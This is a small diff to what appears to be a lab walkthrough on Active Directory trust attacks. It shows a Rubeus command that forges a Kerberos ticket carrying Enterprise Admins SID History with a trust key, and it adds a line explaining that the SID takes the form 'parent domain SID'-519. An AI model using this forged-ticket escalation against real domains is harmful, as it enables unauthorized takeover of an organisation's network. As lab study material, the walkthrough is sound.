@@ -39,6 +39,8 @@ Next, forge a ticket whose SID History is of `Enterprise Admins` group. The SPN 
 > Rubeus.exe evasive-silver /user:Administrator /ldap /service:krbtgt/US.TECHCORP.LOCAL /rc4:<trust key> /sids:<enterprise admins SID> /nowrap
 ```
 
+For `sids` it is of the form "parent domain SID"-519 (for enterprise admins).
+
 Then, ask another service ticket for service HTTP using the previous ticket:
 
 ```powershell
